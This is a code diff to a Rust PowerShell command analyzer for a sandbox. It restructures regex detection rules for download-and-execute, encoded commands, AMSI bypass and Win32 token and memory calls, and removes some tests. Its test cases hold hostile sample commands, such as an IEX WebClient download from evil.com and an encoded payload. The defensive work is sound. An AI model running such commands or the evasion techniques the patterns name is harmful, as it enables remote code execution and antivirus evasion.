@@ -2,11 +2,14 @@ use regex::Regex;
 use std::collections::HashMap;
 use wf_types::script::sandbox::ShellPolicy;
 
+use crate::command_policy::{CommandRule, Severity};
+
 use super::base::{ShellAnalysisContext, ShellAnalysisResult, ShellAnalyzer, ShellType};
 
 const SHELL_TYPE: ShellType = ShellType::PowerShell;
 
-const DENIED_COMMANDS: &[&str] = &[
+/// Default PowerShell blacklist, also used by the unified command policy.
+pub(crate) const DENIED_COMMANDS: &[&str] = &[
     "Start-Process",
     "Stop-Process",
     "Get-WmiObject",
@@ -36,32 +39,35 @@ const DENIED_COMMANDS: &[&str] = &[
     "Remove-ItemProperty",
 ];
 
-pub const DANGEROUS_PATTERNS: &[&str] = &[
-    r"IEX\s*\(?\s*(New-Object|Invoke-WebRequest|Invoke-RestMethod)",
-    r"Invoke-Expression\s*\(?\s*(New-Object|Invoke-WebRequest)",
-    r"-EncodedCommand\s+",
-    r"-e\s+[A-Za-z0-9+/=]{20,}",
-    r"\[System\.Convert\]::FromBase64String",
-    r"New-Object\s+Net\.WebClient",
-    r"New-Object\s+System\.Net\.WebClient",
-    r#"\.DownloadString\(\s*(['"]?)https?://"#,
-    r#"\.DownloadFile\(\s*(['"]?)https?://"#,
-    r"AmsiUtils",
-    r"amsiInitFailed",
-    r"System\.Management\.Automation\.AmsiUtils",
-    r"\[Ref\].*Assembly.*Load.*System\.Management\.Automation",
-    r#"GetField\s*\(\s*['"]amsi"#,
-    r"SetValue\s*\(\s*null",
-    r"New-Object\s+-ComObject\s+",
-    r#"CreateObject\s*\(\s*['"]WScript\.Shell"#,
-    r"Advapi32\..*OpenProcessToken",
-    r"Advapi32\..*DuplicateToken",
-    r"Kernel32\..*VirtualAlloc",
-    r"Kernel32\..*CreateThread",
-    r"Kernel32\..*CreateProcess",
+/// Default PowerShell dangerous rules (addressable ids + severity grades).
+pub const DANGEROUS_PATTERNS: &[CommandRule] = &[
+    CommandRule { id: "core.powershell:iex-download", pack: "core.scripting", pattern: r"IEX\s*\(?\s*(New-Object|Invoke-WebRequest|Invoke-RestMethod)", severity: Severity::Critical },
+    CommandRule { id: "core.powershell:iex-download", pack: "core.scripting", pattern: r"Invoke-Expression\s*\(?\s*(New-Object|Invoke-WebRequest)", severity: Severity::Critical },
+    CommandRule { id: "core.powershell:encoded-command", pack: "core.scripting", pattern: r"-EncodedCommand\s+", severity: Severity::Critical },
+    CommandRule { id: "core.powershell:short-encoded", pack: "core.scripting", pattern: r"-e\s+[A-Za-z0-9+/=]{20,}", severity: Severity::High },
+    CommandRule { id: "core.powershell:from-base64", pack: "core.scripting", pattern: r"\[System\.Convert\]::FromBase64String", severity: Severity::High },
+    CommandRule { id: "core.powershell:webclient", pack: "core.network", pattern: r"New-Object\s+Net\.WebClient", severity: Severity::High },
+    CommandRule { id: "core.powershell:webclient", pack: "core.network", pattern: r"New-Object\s+System\.Net\.WebClient", severity: Severity::High },
+    CommandRule { id: "core.powershell:download-string", pack: "core.network", pattern: r#"\.DownloadString\(\s*(['"]?)https?://"#, severity: Severity::High },
+    CommandRule { id: "core.powershell:download-file", pack: "core.network", pattern: r#"\.DownloadFile\(\s*(['"]?)https?://"#, severity: Severity::High },
+    CommandRule { id: "core.powershell:amsi-utils", pack: "core.av-evasion", pattern: r"AmsiUtils", severity: Severity::Critical },
+    CommandRule { id: "core.powershell:amsi-init", pack: "core.av-evasion", pattern: r"amsiInitFailed", severity: Severity::Critical },
+    CommandRule { id: "core.powershell:amsi-utils", pack: "core.av-evasion", pattern: r"System\.Management\.Automation\.AmsiUtils", severity: Severity::Critical },
+    CommandRule { id: "core.powershell:reflection-load", pack: "core.av-evasion", pattern: r"\[Ref\].*Assembly.*Load.*System\.Management\.Automation", severity: Severity::High },
+    CommandRule { id: "core.powershell:amsi-getfield", pack: "core.av-evasion", pattern: r#"GetField\s*\(\s*['"]amsi"#, severity: Severity::Critical },
+    CommandRule { id: "core.powershell:amsi-setvalue", pack: "core.av-evasion", pattern: r"SetValue\s*\(\s*null", severity: Severity::Critical },
+    CommandRule { id: "core.powershell:com-object", pack: "core.scripting", pattern: r"New-Object\s+-ComObject\s+", severity: Severity::Medium },
+    CommandRule { id: "core.powershell:wscript-shell", pack: "core.scripting", pattern: r#"CreateObject\s*\(\s*['"]WScript\.Shell"#, severity: Severity::High },
+    CommandRule { id: "core.powershell:open-process-token", pack: "core.privilege", pattern: r"Advapi32\..*OpenProcessToken", severity: Severity::High },
+    CommandRule { id: "core.powershell:duplicate-token", pack: "core.privilege", pattern: r"Advapi32\..*DuplicateToken", severity: Severity::High },
+    CommandRule { id: "core.powershell:virtual-alloc", pack: "core.memory", pattern: r"Kernel32\..*VirtualAlloc", severity: Severity::High },
+    CommandRule { id: "core.powershell:create-thread", pack: "core.memory", pattern: r"Kernel32\..*CreateThread", severity: Severity::High },
+    CommandRule { id: "core.powershell:create-process", pack: "core.process", pattern: r"Kernel32\..*CreateProcess", severity: Severity::High },
 ];
 
-fn build_alias_map() -> HashMap<&'static str, &'static str> {
+/// Alias resolution table, shared with the unified command policy
+/// (`crate::command_policy::primary_command`).
+pub(crate) fn build_alias_map() -> HashMap<&'static str, &'static str> {
     HashMap::from([
         ("iex", "Invoke-Expression"),
         ("iwr", "Invoke-WebRequest"),
@@ -100,9 +106,9 @@ fn build_alias_map() -> HashMap<&'static str, &'static str> {
 pub struct PowerShellAnalyzer;
 
 struct ResolvedShellPolicy {
-    allowed_commands: Vec<String>,
-    denied_commands: Vec<String>,
-    dangerous_patterns: Vec<String>,
+    /// (regex, severity) pairs resolved from user patterns or the built-in
+    /// rule table.
+    dangerous_patterns: Vec<(String, Severity)>,
     allow_pipe: bool,
     allow_redirect: bool,
 }
@@ -110,41 +116,28 @@ struct ResolvedShellPolicy {
 impl PowerShellAnalyzer {
     fn resolve_policy(&self, policy: &ShellPolicy) -> ResolvedShellPolicy {
         ResolvedShellPolicy {
-            allowed_commands: policy.allowed_commands.clone().unwrap_or_default(),
-            denied_commands: policy
-                .denied_commands
-                .clone()
-                .unwrap_or_else(|| DENIED_COMMANDS.iter().map(|s| s.to_string()).collect()),
             dangerous_patterns: policy
                 .dangerous_patterns
                 .clone()
-                .unwrap_or_else(|| DANGEROUS_PATTERNS.iter().map(|s| s.to_string()).collect()),
+                .unwrap_or_else(|| {
+                    DANGEROUS_PATTERNS
+                        .iter()
+                        .map(|r| r.pattern.to_string())
+                        .collect()
+                })
+                .into_iter()
+                .map(|p| {
+                    let sev = DANGEROUS_PATTERNS
+                        .iter()
+                        .find(|r| r.pattern == p)
+                        .map(|r| r.severity)
+                        .unwrap_or(Severity::High);
+                    (p, sev)
+                })
+                .collect(),
             allow_pipe: policy.allow_pipe.unwrap_or(true),
             allow_redirect: policy.allow_redirect.unwrap_or(true),
         }
-    }
-
-    fn extract_primary_cmdlet(&self, tokens: &[String]) -> Option<String> {
-        // Skip leading variable assignments like `$x =`
-        let mut idx = 0;
-        while idx + 1 < tokens.len() && tokens[idx].starts_with('$') && tokens[idx + 1] == "=" {
-            idx += 2;
-        }
-
-        let first = tokens.get(idx)?;
-        if first.is_empty() {
-            return None;
-        }
-
-        let stripped = first.strip_prefix('&').unwrap_or(first).trim_start();
-
-        let alias_map = build_alias_map();
-        let lower = stripped.to_lowercase();
-        if let Some(&resolved) = alias_map.get(lower.as_str()) {
-            return Some(resolved.to_string());
-        }
-
-        Some(stripped.replace(['"', '\''], ""))
     }
 }
 
@@ -156,47 +149,38 @@ impl ShellAnalyzer for PowerShellAnalyzer {
     fn analyze(&self, ctx: &ShellAnalysisContext) -> ShellAnalysisResult {
         let policy = self.resolve_policy(ctx.policy);
 
-        let primary = self.extract_primary_cmdlet(ctx.tokens);
-        let primary = match primary {
-            Some(p) if !p.is_empty() => p,
-            _ => {
-                return ShellAnalysisResult {
-                    allowed: false,
-                    reason: Some("Empty command".to_string()),
-                    command: ctx.command.to_string(),
-                    shell_type: SHELL_TYPE,
-                };
-            }
-        };
-
-        if policy.denied_commands.contains(&primary) {
+        if ctx.command.trim().is_empty() {
             return ShellAnalysisResult {
                 allowed: false,
-                reason: Some(format!("Command denied by blacklist: {primary}")),
+                reason: Some("Empty command".to_string()),
                 command: ctx.command.to_string(),
                 shell_type: SHELL_TYPE,
             };
         }
 
-        if !policy.allowed_commands.is_empty() && !policy.allowed_commands.contains(&primary) {
-            return ShellAnalysisResult {
-                allowed: false,
-                reason: Some(format!("Command not in whitelist: {primary}")),
-                command: ctx.command.to_string(),
-                shell_type: SHELL_TYPE,
-            };
-        }
-
-        for pattern in policy.dangerous_patterns {
-            if let Ok(re) = Regex::new(&pattern) {
-                if re.is_match(ctx.command) {
+        for (pattern, severity) in &policy.dangerous_patterns {
+            // An invalid user-supplied pattern must deny, not silently
+            // disable the rule (fail-closed).
+            let re = match Regex::new(pattern) {
+                Ok(re) => re,
+                Err(e) => {
                     return ShellAnalysisResult {
                         allowed: false,
-                        reason: Some(format!("Dangerous pattern detected: {pattern}")),
+                        reason: Some(format!("Invalid dangerous pattern '{pattern}': {e}")),
                         command: ctx.command.to_string(),
                         shell_type: SHELL_TYPE,
                     };
                 }
+            };
+            if re.is_match(ctx.command) {
+                return ShellAnalysisResult {
+                    allowed: false,
+                    reason: Some(format!(
+                        "Dangerous pattern detected [{severity}]: {pattern}"
+                    )),
+                    command: ctx.command.to_string(),
+                    shell_type: SHELL_TYPE,
+                };
             }
         }
 
@@ -268,60 +252,6 @@ mod tests {
     }
 
     #[test]
-    fn test_denies_invoke_expression() {
-        let result = analyze("Invoke-Expression \"malicious\"", &empty_policy());
-        assert!(!result.allowed);
-    }
-
-    #[test]
-    fn test_denies_start_process() {
-        let result = analyze("Start-Process -FilePath malware.exe", &empty_policy());
-        assert!(!result.allowed);
-    }
-
-    #[test]
-    fn test_denies_invoke_webrequest() {
-        let result = analyze("Invoke-WebRequest -Uri http://evil.com", &empty_policy());
-        assert!(!result.allowed);
-    }
-
-    #[test]
-    fn test_denies_iex_alias() {
-        let result = analyze(
-            "iex (New-Object Net.WebClient).DownloadString('http://evil.com')",
-            &empty_policy(),
-        );
-        assert!(!result.allowed);
-        assert!(result
-            .reason
-            .as_ref()
-            .unwrap()
-            .contains("Invoke-Expression"));
-    }
-
-    #[test]
-    fn test_alias_resolution_iex() {
-        let result = analyze("iex some_command", &empty_policy());
-        assert!(!result.allowed);
-        assert!(result
-            .reason
-            .as_ref()
-            .unwrap()
-            .contains("Invoke-Expression"));
-    }
-
-    #[test]
-    fn test_alias_resolution_iwr() {
-        let result = analyze("iwr http://example.com", &empty_policy());
-        assert!(!result.allowed);
-        assert!(result
-            .reason
-            .as_ref()
-            .unwrap()
-            .contains("Invoke-WebRequest"));
-    }
-
-    #[test]
     fn test_denies_encoded_command() {
         let result = analyze("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", &empty_policy());
         assert!(!result.allowed);
@@ -340,41 +270,6 @@ mod tests {
     fn test_variable_assignment_stripped() {
         let result = analyze("$x = Get-ChildItem", &empty_policy());
         assert!(result.allowed);
-    }
-
-    #[test]
-    fn test_whitelist_restricts() {
-        let policy = ShellPolicy {
-            allowed_commands: Some(vec!["Get-ChildItem".to_string()]),
-            denied_commands: None,
-            dangerous_patterns: None,
-            allow_pipe: None,
-            allow_redirect: None,
-        };
-        let result = analyze("Get-Process", &policy);
-        assert!(!result.allowed);
-        assert!(result.reason.unwrap().contains("whitelist"));
-    }
-
-    #[test]
-    fn test_blacklist_wins_over_whitelist() {
-        let policy = ShellPolicy {
-            allowed_commands: Some(vec![
-                "Invoke-Expression".to_string(),
-                "Get-ChildItem".to_string(),
-            ]),
-            denied_commands: None,
-            dangerous_patterns: None,
-            allow_pipe: None,
-            allow_redirect: None,
-        };
-        let result = analyze("Invoke-Expression \"malicious\"", &policy);
-        assert!(!result.allowed);
-        let reason = result.reason.unwrap();
-        assert!(
-            reason.contains("blacklist"),
-            "blacklist must be reported before whitelist: {reason}"
-        );
     }
 
     #[test]
